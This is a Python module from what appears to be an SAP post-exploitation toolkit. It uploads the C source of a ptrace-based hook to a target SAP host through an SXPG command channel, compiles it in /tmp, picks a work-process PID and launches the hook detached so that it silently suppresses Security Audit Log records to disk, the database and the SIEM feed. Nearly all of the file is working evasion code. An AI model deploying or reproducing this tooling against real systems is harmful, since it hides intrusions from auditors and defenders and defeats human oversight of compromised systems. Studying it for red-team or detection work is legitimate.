"""Virtual SAP Death Star — in-memory SAL suppression via ptrace hook.

Deploys and launches Julian Petersohn's ``sap_audit_hook`` C program on a
target SAP host so it attaches (via ``ptrace``) to running ``disp+work``
work-processes and plants INT3 breakpoints on the three SAL sinks
(``fwrite`` to disk, ``write_event_to_DB``, ``EtdSendEvent``).  In
``--suppress`` mode it silently drops audit records matching the operator's
filter across all three paths — the SAL never receives them, SM20 shows
nothing, and the ETD feed / SIEM sees nothing either.

**Not a 0-day.**  SAP confirmed publicly (see the upstream README at
https://github.com/randomstr1ng/virtual-sap-death-star) that this is a
post-exploitation technique.  Running it requires a local shell as
``<sid>adm`` on the SAP host and ``kernel.yama.ptrace_scope <= 1``.  Both
imply the OS-level foothold that any hardened SAP environment should be
preventing at the perimeter.

Integration model:
  * ``deploy_and_launch(node, ...)``  — upload source, compile, launch
    background suppress process, return ``{ok, hook_pid, target_pid, ...}``
  * ``stop(node, ...)``               — SIGTERM the hook (clean detach
    restores the original INT3 bytes)
  * ``verify_running(node, hook_pid)`` — one-shot ``kill -0`` health check

The Tier 3 wrapper (``sapmap_evasion_tier3.tier3_sal_death_star_launch`` /
``_stop``) sits on top of these and enforces the ``--allow-evasion`` gate.
"""

from __future__ import annotations

import base64
import gzip
import logging
import os
import re
from typing import Optional

logger = logging.getLogger(__name__)

# Vendored source lives next to this module.  Kept as .c source rather
# than a pre-built binary so the operator can inspect + audit + rebuild
# for their target's glibc.  Compilation happens on the target itself.
_VENDOR_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "vendor")
HOOK_SOURCE_PATH = os.path.join(_VENDOR_DIR, "sap_audit_hook.c")

# Default install layout on the target.  ``<sid>adm`` always has write
# access to ``/tmp`` and can execute from it (SAP hosts don't ship with
# noexec on /tmp by default).  Operator can override via kwargs.
DEFAULT_REMOTE_DIR = "/tmp"
DEFAULT_SOURCE_NAME = "sap_audit_hook.c"
DEFAULT_BINARY_NAME = "sap_audit_hook"
DEFAULT_LOG_NAME = "sap_audit_hook.log"
DEFAULT_PIDFILE_NAME = "sap_audit_hook.pid"

# Compile command.  Matches the upstream README verbatim so a build
# failure on the target reproduces exactly what a manual operator would
# see when following Julian's instructions.
_COMPILE_CMD = (
    "gcc -O2 -Wall -Wno-format-truncation "
    "-o {binary} {source}"
)


class DeathStarError(RuntimeError):
    """Raised when a Death Star deployment step fails in a way the caller
    should surface to the operator (compile error, no worker PID found,
    permission denied, etc.)."""


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _read_source_bytes() -> bytes:
    """Return the raw C source bytes for upload.  Raised as an error if
    the vendored file is missing (e.g. someone ran a partial install)."""
    if not os.path.isfile(HOOK_SOURCE_PATH):
        raise DeathStarError(
            f"Vendored source not found at {HOOK_SOURCE_PATH!r}.  "
            "The postex/vendor/ directory ships with SAPMAP — verify "
            "the install is complete.")
    with open(HOOK_SOURCE_PATH, "rb") as fh:
        return fh.read()


def _gzip_b64(data: bytes) -> str:
    """gzip + base64-encode ``data`` so we can drop it through the ~60 KB
    C source over an SXPG command channel efficiently.  Gzip cuts the
    raw source (~61 KB) to ~15 KB; base64 grows that back to ~20 KB.
    Compared to raw-base64 (~82 KB) that's a 4x reduction — matters when
    every chunk costs 1-2 s of SXPG round-trip time."""
    return base64.b64encode(gzip.compress(data, compresslevel=9)).decode(
        "ascii")


def _shellquote(s: str) -> str:
    """Escape ``s`` for a single-quoted shell literal.  Used for paths
    passed into the remote bash script.  We restrict ourselves to POSIX
    single-quote semantics: everything is literal except ``'`` itself,
    which we terminate + escape + resume."""
    return "'" + s.replace("'", "'\"'\"'") + "'"


def _run(node, command: str, params: str = "", label: str = "") -> dict:
    """Wrapper around ``sapmap_exploit.run_os_command`` that logs the
    command line before firing.  Every death-star OS step goes through
    here so the operator sees exactly what ran on the target."""
    import sapmap_exploit as _sx
    disp = f"{command} {params}".strip()
    if label:
        print(f"[*] {node.sid}: death_star: {label}")
    print(f"[*] {node.sid}: death_star: exec  {disp[:220]}"
           f"{'…' if len(disp) > 220 else ''}")
    return _sx.run_os_command(node, command, params)


# ---------------------------------------------------------------------------
# Upload
# ---------------------------------------------------------------------------

def upload_source(node, remote_dir: str = DEFAULT_REMOTE_DIR,
                    source_name: str = DEFAULT_SOURCE_NAME) -> str:
    """Upload the C source to ``<remote_dir>/<source_name>``.

    Uses gzip + base64 to compress the transfer, then decodes on the
    target with ``base64 -d | gunzip``.  Both tools ship with every
    modern Linux distro (GNU coreutils + gzip).  Returns the absolute
    remote path.

    The whole payload is sent as one big argv token to ``/bin/sh -c``
    so we don't have to chunk on the sending side.  Modern kernels have
    a huge ARG_MAX (typically 2 MB) and our ~20 KB payload sits well
    under that; SAPXPG's ~15 s command budget is also fine for a single
    decode.
    """
    src = _read_source_bytes()
    payload = _gzip_b64(src)
    remote_path = f"{remote_dir.rstrip('/')}/{source_name}"

    # bash pipeline: echo the base64 → base64 -d → gunzip → target file.
    # ``echo`` is a builtin so the whole payload is a single argv slot.
    #
    # Guard: fail loudly if any step fails (set -e) so the caller gets
    # a clear ``success=False`` back rather than a truncated file.
    quoted_path = _shellquote(remote_path)
    script = (
        "set -e; "
        f"echo {payload} | base64 -d | gunzip > {quoted_path}"
    )

    r = _run(node, "/bin/sh", f"-c {_shellquote(script)}",
              label=f"upload source ({len(src)} B raw, "
                    f"{len(payload)} B compressed b64) → {remote_path}")
    if not r.get("success"):
        raise DeathStarError(
            f"upload failed: {r.get('error') or 'unknown error'}")
    # Sanity: verify the file exists + has plausible size.
    check = _run(node, "/bin/sh",
                  f"-c {_shellquote(f'wc -c {quoted_path}')}",
                  label="verify upload")
    if check.get("success"):
        out = " ".join(check.get("output") or []).strip()
        print(f"[+] {node.sid}: death_star: uploaded — {out}")
    return remote_path


# ---------------------------------------------------------------------------
# Compile
# ---------------------------------------------------------------------------

def compile_hook(node, source_path: str,
                  binary_path: Optional[str] = None) -> str:
    """Compile the uploaded source with gcc.  Returns the absolute path
    to the produced binary.  Raises ``DeathStarError`` on any gcc
    failure — the compilation output is included in the message so the
    operator can see missing headers, etc."""
    if binary_path is None:
        binary_path = source_path[:-2] if source_path.endswith(".c") else (
            source_path + ".bin")
    cmd = _COMPILE_CMD.format(
        binary=_shellquote(binary_path),
        source=_shellquote(source_path),
    )
    r = _run(node, "/bin/sh", f"-c {_shellquote(cmd)}",
              label=f"compile → {binary_path}")
    if not r.get("success"):
        stderr = r.get("error") or ""
        stdout = "\n".join(r.get("output") or [])
        raise DeathStarError(
            f"gcc failed: {stderr or stdout or 'unknown'}")
    # Confirm the binary exists.  gcc sometimes returns rc=0 even when a
    # linker step silently produced nothing (unusual, but seen on
    # sandboxed SXPG shells with restricted /tmp).
    check = _run(node, "/bin/sh",
                  f"-c {_shellquote(f'test -x {_shellquote(binary_path)} && echo OK')}",
                  label="verify binary")
    if not check.get("success") or "OK" not in " ".join(
            check.get("output") or []):
        raise DeathStarError(
            f"compile reported success but {binary_path!r} is not "
            "executable")
    print(f"[+] {node.sid}: death_star: compiled → {binary_path}")
    return binary_path


# ---------------------------------------------------------------------------
# Worker-PID discovery
# ---------------------------------------------------------------------------

# comm name pattern for an audit-writing work process.  Matches both the
# old ``disp+work`` name (kernel ≤ 749) and the new ``dw.sap<SID>_<inst>``
# name (kernel ≥ 750).  The trailing ``_W<n>`` marks a dialog/work slot.
_WORKER_COMM_RE = re.compile(
    r"^(?P<pid>\d+)\s+(?P<comm>\S+)\s+(?P<args>.+)$"
)


def find_worker_pid(node) -> tuple[int, str]:
    """Find a disp+work work-process PID (not the dispatcher) suitable
    for hooking.  Returns ``(pid, comm)``.

    Prefers a ``_W<n>`` worker (dialog) since dialog work-processes
    handle the widest range of audit-worthy actions (logon, tx-code
    execution, RFC calls).  Falls back to any ``_BTC`` / ``_SPO`` /
    ``_UP2`` process if no ``_W<n>`` exists.  Refuses the dispatcher
    (``_DP``) because it never emits audit records.
    """
    r = _run(node, "/bin/sh",
              "-c 'ps -eo pid,comm,args --no-headers'",
              label="enumerate SAP processes")
    if not r.get("success"):
        raise DeathStarError(
            f"ps failed: {r.get('error') or 'unknown'}")
    workers = []
    fallbacks = []
    for line in r.get("output") or []:
        m = _WORKER_COMM_RE.match(line.strip())
        if not m:
            continue
        comm = m.group("comm")
        args = m.group("args")
        pid = int(m.group("pid"))
        # Only SAP work-processes.  The C hook itself does a stricter
        # /proc/PID/exe check on attach; this is the pre-filter so we
        # don't hand it a random PID.
        if "disp+work" not in comm and not comm.startswith("dw.sap"):
            if "disp+work" not in args and "dw.sap" not in args:
                continue
        # Dispatcher — skip.  The hook detects this too but a
        # cross-check here saves an SXPG round-trip.
        if comm.endswith("_DP"):
            continue
        if re.search(r"_W\d+$", comm):
            workers.append((pid, comm))
        else:
            fallbacks.append((pid, comm))
    if workers:
        pid, comm = workers[0]
        print(f"[+] {node.sid}: death_star: worker PID {pid} ({comm})")
        return pid, comm
    if fallbacks:
        pid, comm = fallbacks[0]
        print(f"[+] {node.sid}: death_star: fallback PID {pid} ({comm}) "
              f"— no dialog worker found")
        return pid, comm
    raise DeathStarError(
        "no disp+work / dw.sap processes found — verify SAP is running "
        "on this host, or run "
        "`ps -eo pid,comm,args | grep -E 'disp\\+work|dw\\.sap'` by hand.")


# ---------------------------------------------------------------------------
# Launch
# ---------------------------------------------------------------------------

def launch(node, binary_path: str, target_pid: int,
             filter_classes: str = "", verbose: bool = False,
             log_path: Optional[str] = None,
             pidfile_path: Optional[str] = None) -> int:
    """Launch the hook in ``--suppress`` mode against ``target_pid``,
    detached from the operator's SXPG session so it survives after the
    RFC round-trip completes.

    Uses ``nohup + setsid + &`` so the hook keeps running even after
    the parent shell exits (the SXPG worker's session gets torn down at
    the end of the RFC call).  Redirects stdout/stderr to ``log_path``
    so post-hoc inspection is possible.

    Returns the launched hook's PID.  Raises ``DeathStarError`` if the
    process didn't come up (e.g. ptrace_scope > 1, or --pid target
    already exited).
    """
    if log_path is None:
        log_path = f"{DEFAULT_REMOTE_DIR}/{DEFAULT_LOG_NAME}"
    if pidfile_path is None:
        pidfile_path = f"{DEFAULT_REMOTE_DIR}/{DEFAULT_PIDFILE_NAME}"

    args = ["--suppress", "--pid", str(target_pid)]
    if filter_classes.strip():
        args.extend(["--filter", filter_classes.strip()])
    if verbose:
        args.append("-v")
    argv_str = " ".join(_shellquote(a) for a in args)

    # bash pipeline:
    #   * set -e so any step failure surfaces
    #   * kill any previous hook writing the same pidfile (idempotent
    #     relaunches — an operator may re-arm mid-run)
    #   * setsid + nohup + & so we survive the RFC call teardown
    #   * echo $! into the pidfile so the caller can stop us later
    quoted_bin = _shellquote(binary_path)
    quoted_log = _shellquote(log_path)
    quoted_pidfile = _shellquote(pidfile_path)
    script = (
        "set -e; "
        # Best-effort kill previous instance.
        f"if [ -s {quoted_pidfile} ]; then "
        f"  OLD=$(cat {quoted_pidfile}); "
        f"  kill -0 \"$OLD\" 2>/dev/null && kill -TERM \"$OLD\" 2>/dev/null || true; "
        f"  rm -f {quoted_pidfile}; "
        f"fi; "
        # Launch detached.  ``setsid`` gives us a fresh session so the
        # process isn't reaped when SXPG closes the parent PGID.
        f"setsid nohup {quoted_bin} {argv_str} "
        f">> {quoted_log} 2>&1 < /dev/null & "
        # Persist PID.  ``$!`` is the last backgrounded PID under bash.
        f"echo $! > {quoted_pidfile}; "
        f"cat {quoted_pidfile}"
    )

    r = _run(node, "/bin/sh", f"-c {_shellquote(script)}",
              label=(f"launch --suppress"
                     + (f" --filter {filter_classes.strip()}"
                        if filter_classes.strip() else " (all classes)")
                     + f" --pid {target_pid}"))
    if not r.get("success"):
        raise DeathStarError(
            f"launch failed: {r.get('error') or 'unknown'}")
    out = " ".join(r.get("output") or []).strip().split()
    if not out:
        raise DeathStarError(
            "launch succeeded but no PID emitted — check "
            f"{log_path} on the target for hook start-up errors")
    try:
        hook_pid = int(out[-1])
    except ValueError:
        raise DeathStarError(
            f"unexpected launch output — got {' '.join(out)!r}")
    print(f"[+] {node.sid}: death_star: hook running as PID {hook_pid} "
           f"(log: {log_path})")
    return hook_pid


# ---------------------------------------------------------------------------
# Stop
# ---------------------------------------------------------------------------

def stop(node, pidfile_path: Optional[str] = None,
          binary_path: Optional[str] = None) -> dict:
    """Send SIGTERM to the running hook.  The hook's SIGTERM handler
    (``sig_handler``) drops out of the main loop and calls
    ``detach_all()`` which restores every INT3 byte before releasing
    ptrace — a hard-kill (SIGKILL) would leave the disp+work bytes
    patched, so we never use it.

    Returns ``{ok, pid, message}``.  ``ok=False`` when no pidfile or
    the process wasn't running.  Never raises — cleanup should be
    tolerant to concurrent state (operator may have kill'd it by
    hand already).
    """
    if pidfile_path is None:
        pidfile_path = f"{DEFAULT_REMOTE_DIR}/{DEFAULT_PIDFILE_NAME}"
    if binary_path is None:
        binary_path = f"{DEFAULT_REMOTE_DIR}/{DEFAULT_BINARY_NAME}"

    quoted_pidfile = _shellquote(pidfile_path)
    quoted_bin = _shellquote(binary_path)
    # Best-effort: try the pidfile first, then a comm-name fallback in
    # case the pidfile was lost.
    script = (
        f"PID=''; "
        f"if [ -s {quoted_pidfile} ]; then PID=$(cat {quoted_pidfile}); fi; "
        f"if [ -z \"$PID\" ]; then "
        f"  PID=$(pgrep -f {quoted_bin} 2>/dev/null | head -1); "
        f"fi; "
        f"if [ -z \"$PID\" ]; then echo NOT_RUNNING; exit 0; fi; "
        f"kill -TERM $PID 2>/dev/null || true; "
        # Give the hook up to ~3 s to detach cleanly.  detach_all()
        # restores INT3 bytes on every attached worker; a hurried kill
        # would leave patched instructions in disp+work.
        f"for i in 1 2 3 4 5 6; do "
        f"  kill -0 $PID 2>/dev/null || break; "
        f"  sleep 0.5; "
        f"done; "
        f"if kill -0 $PID 2>/dev/null; then "
        f"  echo STILL_RUNNING $PID; "
        f"else "
        f"  echo STOPPED $PID; "
        f"  rm -f {quoted_pidfile}; "
        f"fi"
    )
    r = _run(node, "/bin/sh", f"-c {_shellquote(script)}",
              label=f"SIGTERM hook (pidfile {pidfile_path})")
    out = " ".join(r.get("output") or []).strip()
    if "NOT_RUNNING" in out:
        return {"ok": False, "pid": None,
                "message": "no hook process found — nothing to stop"}
    if out.startswith("STOPPED"):
        try:
            pid = int(out.split()[-1])
        except (IndexError, ValueError):
            pid = None
        print(f"[+] {node.sid}: death_star: hook PID {pid} stopped "
               f"(INT3 bytes restored, ptrace detached)")
        return {"ok": True, "pid": pid, "message": "stopped cleanly"}
    if out.startswith("STILL_RUNNING"):
        try:
            pid = int(out.split()[-1])
        except (IndexError, ValueError):
            pid = None
        print(f"[!] {node.sid}: death_star: hook PID {pid} did not exit "
               f"within 3 s — operator may need to check manually")
        return {"ok": False, "pid": pid,
                "message": "SIGTERM sent but hook did not exit within 3 s"}
    return {"ok": False, "pid": None,
            "message": f"unexpected stop output: {out!r}"}


# ---------------------------------------------------------------------------
# End-to-end
# ---------------------------------------------------------------------------

def deploy_and_launch(node, filter_classes: str = "",
                        remote_dir: str = DEFAULT_REMOTE_DIR,
                        target_pid: Optional[int] = None,
                        skip_upload: bool = False,
                        skip_compile: bool = False,
                        verbose: bool = False) -> dict:
    """Full pipeline: upload → compile → find worker → launch.

    Returns::

        {
          ok, source_path, binary_path, target_pid, target_comm,
          hook_pid, log_path, pidfile_path, filter_classes,
        }

    Raises ``DeathStarError`` on any step failure; the exception message
    is human-readable and suitable for surfacing to the operator.

    Args:
      node:            SAPMAP ``SAPNode`` to deploy against.  Requires
                       Linux OS-exec capability.
      filter_classes:  Comma-separated audit-class list, e.g. ``"AUW"``
                       or ``"AUW,AU3"``.  Empty → suppress all audit
                       classes (loudest, but simplest to test).
      remote_dir:      Directory on the target for source + binary +
                       log + pidfile.  Defaults to ``/tmp`` since every
                       ``<sid>adm`` has write access there and it
                       survives long enough for the hook lifetime.
      target_pid:      Force a specific disp+work PID.  When ``None``,
                       we auto-pick the first ``_W<n>`` worker.
      skip_upload:     Reuse a previously-uploaded ``sap_audit_hook.c``
                       — useful for reruns during operator iteration.
      skip_compile:    Reuse a previously-compiled ``sap_audit_hook``
                       binary — same rationale.
      verbose:         Pass ``-v`` to the hook.  Turns on hook-side
                       diagnostic prints to the log file.
    """
    source_path = f"{remote_dir.rstrip('/')}/{DEFAULT_SOURCE_NAME}"
    binary_path = f"{remote_dir.rstrip('/')}/{DEFAULT_BINARY_NAME}"
    log_path = f"{remote_dir.rstrip('/')}/{DEFAULT_LOG_NAME}"
    pidfile_path = f"{remote_dir.rstrip('/')}/{DEFAULT_PIDFILE_NAME}"

    if not skip_upload:
        upload_source(node, remote_dir=remote_dir)
    else:
        print(f"[*] {node.sid}: death_star: skip_upload — reusing "
              f"{source_path}")

    if not skip_compile:
        compile_hook(node, source_path, binary_path)
    else:
        print(f"[*] {node.sid}: death_star: skip_compile — reusing "
              f"{binary_path}")

    if target_pid is None:
        target_pid, target_comm = find_worker_pid(node)
    else:
        target_comm = f"(operator-supplied PID {target_pid})"

    hook_pid = launch(node, binary_path, target_pid,
                       filter_classes=filter_classes,
                       verbose=verbose,
                       log_path=log_path,
                       pidfile_path=pidfile_path)

    return {
        "ok": True,
        "source_path": source_path,
        "binary_path": binary_path,
        "target_pid": target_pid,
        "target_comm": target_comm,
        "hook_pid": hook_pid,
        "log_path": log_path,
        "pidfile_path": pidfile_path,
        "filter_classes": filter_classes,
    }
